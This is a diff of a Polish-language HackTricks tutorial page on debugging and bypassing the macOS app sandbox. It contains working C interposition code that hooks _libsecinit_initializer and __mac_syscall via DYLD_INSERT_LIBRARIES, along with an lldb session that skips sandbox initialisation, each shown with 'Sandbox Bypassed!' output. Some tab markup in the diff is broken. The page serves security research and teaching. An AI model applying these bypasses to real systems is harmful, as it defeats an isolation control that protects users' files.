@@ -1,4 +1,4 @@
-# Debugowanie i omijanie piaskownicy macOS
+# macOS Sandbox Debug & Bypass
 
 <details>
 
@@ -9,7 +9,7 @@ Inne sposoby wsparcia HackTricks:
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -77,18 +77,21 @@ Jeśli z procesu w piaskownicy jesteś w stanie **skompromitować inne procesy**
 [**To badanie**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) odkryło 2 sposoby na omijanie piaskownicy. Ponieważ piaskownica jest stosowana z przestrzeni użytkownika podczas ładowania biblioteki **libSystem**. Jeśli binarny plik mógłby uniknąć jej ładowania, nigdy nie zostałby objęty piaskownicą:
 
 * Jeśli binarny plik byłby **całkowicie statycznie skompilowany**, mógłby uniknąć ładowania tej biblioteki.
-* Jeśli **binarny plik nie musiałby ładować żadnych bibliotek** (ponieważ linker znajduje się również w libSystem), nie musiałby ładować libSystem.&#x20;
+* Jeśli **binarny plik nie musiałby ładować żadnych bibliotek** (ponieważ linker znajduje się również w libSystem), nie musiałby ładować libSystem.
 
 ### Shellkody
 
 Należy zauważyć, że **nawet shellkody** w ARM64 muszą być połączone z `libSystem.dylib`:
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Uprawnienia
 
 Należy zauważyć, że nawet jeśli niektóre **działania** mogą być **dozwolone przez piaskownicę**, jeśli aplikacja ma określone **uprawnienia**, jak na przykład:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ Należy zauważyć, że nawet jeśli niektóre **działania** mogą być **dozwo
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Bypass Interpostowania
 
 Aby uzyskać więcej informacji na temat **interpostowania**, sprawdź:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Interpostuj `_libsecinit_initializer` w celu uniknięcia sandboxa
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Interpost `__mac_syscall` aby zapobiec działaniu piaskownicy
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,18 +183,21 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Debugowanie i omijanie piaskownicy za pomocą lldb
 
 Skompilujmy aplikację, która powinna być objęta piaskownicą:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="undefined" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
+{% endtab %}
+
 {% tab title="entitlements.xml" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -197,7 +207,6 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
-{% tab title="Info.plist" %}
 
 Info.plist to plik konfiguracyjny używany przez aplikacje na systemie macOS. Zawiera informacje o aplikacji, takie jak identyfikator, wersja, uprawnienia i wiele innych. Plik ten jest często używany do konfiguracji zabezpieczeń aplikacji w systemie macOS.
 
@@ -207,7 +216,6 @@ W celu obejścia sandboxa macOS, można próbować zmodyfikować plik Info.plist
 
 Ważne jest również zauważenie, że modyfikacja pliku Info.plist w celu obejścia sandboxa jest nielegalna i narusza zasady bezpieczeństwa systemu macOS. Tylko w przypadku legalnych testów penetracyjnych lub badań bezpieczeństwa można próbować takiego obejścia, ale zawsze zgodnie z prawem i z odpowiednią zgodą.
 
-{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -238,12 +246,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 Aplikacja spróbuje **odczytać** plik **`~/Desktop/del.txt`**, czego **Sandbox nie zezwoli**.\
 Utwórz tam plik, ponieważ po ominięciu Sandbox będzie można go odczytać:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Załóżmy, że debugujemy aplikację, aby zobaczyć, kiedy jest ładowany Sandbox:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -320,6 +330,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Nawet po ominięciu piaskownicy TCC** zapyta użytkownika, czy chce zezwolić procesowi na odczyt plików z pulpitu.
 {% endhint %}
@@ -339,7 +350,7 @@ Inne sposoby wsparcia HackTricks:
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
